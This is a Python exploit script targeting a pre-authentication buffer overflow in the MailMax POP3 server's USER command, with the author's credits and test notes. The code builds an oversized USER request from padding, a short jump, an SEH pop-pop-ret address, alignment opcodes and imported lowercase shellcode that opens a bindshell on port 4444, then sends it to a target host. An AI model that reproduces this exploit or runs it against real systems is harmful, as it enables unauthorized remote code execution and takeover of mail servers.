#!/usr/bin/python

# MailMax <=v4.6 POP3 "USER" Remote Buffer Overflow Exploit (No Login Needed)
# Newer version's not tested, maybe vulnerable too
# A hard one this, the shellcode MUST be lowercase. Plus there are many opcode's that break 
# the payload and opcodes that gets changed, like "\xc3" gets converted to "\xe3", and "\xd3" gets converted to "\xf3"
# written by localh0t
# Date: 29/03/12
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar
# Tested on: Windows XP SP3 Spanish (No DEP)
# Targets: Windows (All) (DEP Disabled)
# Shellcode: Bindshell on port 4444 (Change as you wish) (Lowercase Only, use EBX as baseaddr)

from socket import *

import sys, struct, os, time

from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

	# connect to host
	sock = socket(AF_INET,SOCK_STREAM)
	sock.connect((target_machine,target_port))
	sock.recv(1024)
	time.sleep(5)

	buffer = b"USER "
	buffer += b"A" * 1439 # padding
	buffer += b"\xEB\x06\x90\x90" # Short jmp (6 bytes)
	buffer += b"\x86\xb3\x02\x10" # pop | pop | ret 1c , dbmax2.dll
	buffer += b"\x90" * 8 # nops (just to be sure)

	# popad's, so esp => shellcode
	buffer += b"\x61" * 145
	# nop's to align
	buffer += b"\x90" * 11
	# and ebx,esp
	buffer += b"\x21\xe3" 
	# or ebx,esp
	buffer += b"\x09\xe3" 
	# at this point, ebx = esp. The shellcode is lowercase (with numbers), baseaddr = EBX
	buffer += buf

	buffer += b"\x90" * 2000
	buffer += b"\r\n"
	
	sock.send(buffer)
	sock.close()
	
	sys.exit()